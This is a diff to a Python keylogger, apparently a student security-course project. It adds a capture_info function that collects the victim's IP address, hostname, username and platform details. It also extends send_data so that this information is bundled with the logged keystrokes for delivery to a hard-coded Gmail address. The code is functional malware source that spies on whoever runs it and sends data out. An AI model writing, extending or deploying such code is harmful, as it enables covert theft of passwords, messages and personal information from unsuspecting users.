@@ -7,6 +7,8 @@ from sys import argv
 import threading
 import Queue
 import socket
+import getpass
+import platform
 
 destEmail = 'keylogsenderUIUC460@gmail.com'
 dataBufferSize = 500
@@ -72,12 +74,16 @@ def serverSetup():
 
 def send_data(msg, victimInfo):
 	try:
-                victimIP = victimInfo.get('IP')
-                victimHostName = victimInfo.get('Hostname')
+                IP = victimInfo.get('IP')
+                HostName = victimInfo.get('Hostname')
+                UserName = victimInfo.get('Username')
+                Machine = victimInfo.get('Machine')
                 
                 #build message
-                fullmsg =       ('\n Source IP:' + str(victimIP) +
-                                '\n HostName:' + str(victimHostName) +
+                fullmsg =       ('\nSource IP: ' + str(IP) +
+                                '\nHostName: ' + str(HostName) +
+                                '\nUserName: ' + str(UserName) +
+                                '\n\nSystem Info: \n\n' + str(Machine) +
                                 '\n\n\n\n' + str(msg))
 		print('Message: \n\n' + fullmsg)
 		
@@ -135,16 +141,25 @@ def run_keylogger():
 		except Exception as e:
 			print('Exception: '+str(e))
 
-def run_sender():
-        victimInfo = {}
-        
+def capture_info():
+        info = {}
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
         victimIP = s.getsockname()[0]
         s.close()
-        victimInfo['IP'] = victimIP
+        info['IP'] = victimIP
 
-        victimInfo['Hostname'] = socket.gethostname()
+        info['Hostname'] = socket.gethostname()
+        info['Username'] = getpass.getuser()
+        info['Machine'] = (platform.machine() + '\n' +
+                           platform.platform() + '\n' +
+                           platform.system() + '\n' +
+                           platform.processor())
+
+        return info
+
+def run_sender():
+        victimInfo = capture_info();
         
 	if(local):
 		f = open('keylog.txt', 'w')
